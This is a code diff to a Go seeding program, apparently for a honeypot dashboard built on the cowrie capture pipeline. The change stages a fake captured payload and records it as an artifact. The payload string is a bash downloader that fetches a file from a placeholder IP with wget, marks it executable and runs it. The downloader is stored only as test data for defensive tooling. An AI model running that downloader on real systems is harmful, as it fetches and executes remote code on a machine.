@@ -59,6 +59,23 @@ func main() {
 	for i := range actors {
 		if err := st.UpsertActor(&actors[i]); err != nil { fmt.Println("actor:", err) }
 	}
+
+	// Stage a fake captured payload on disk so Slice G has something
+	// to inspect. Mimics the cowrie capture pipeline writing to
+	// $HOME/.local/share/shardlure/captures/<sha>.bin.
+	capDir := home + "/.local/share/shardlure/captures"
+	_ = os.MkdirAll(capDir, 0o755)
+	fakeBody := []byte("#!/bin/bash\n# downloader\nwget http://1.2.3.4/payload.elf -O /tmp/payload\nchmod +x /tmp/payload\n/tmp/payload\n")
+	fakeSHA := "deadbeefcafebabe000102030405060708090a0b0c0d0e0f10111213141516"
+	fakePath := capDir + "/" + fakeSHA + ".bin"
+	_ = os.WriteFile(fakePath, fakeBody, 0o644)
+	_ = st.RecordArtifact(store.Artifact{
+		TS: now.Add(-44 * time.Minute), SrcIP: "45.67.89.10", SessionID: "S1",
+		ActorID: "cowrie:hassh-aaa", URL: "http://1.2.3.4/payload.elf",
+		LocalPath: fakePath, SHA256: fakeSHA, SizeBytes: int64(len(fakeBody)),
+		Origin: "cowrie-curl", Status: "fetched",
+	})
+
 	n, _ := st.EventCount()
-	fmt.Printf("seeded %d events (DB shows %d), %d actors\n", len(events), n, len(actors))
+	fmt.Printf("seeded %d events (DB shows %d), %d actors, 1 payload\n", len(events), n, len(actors))
 }
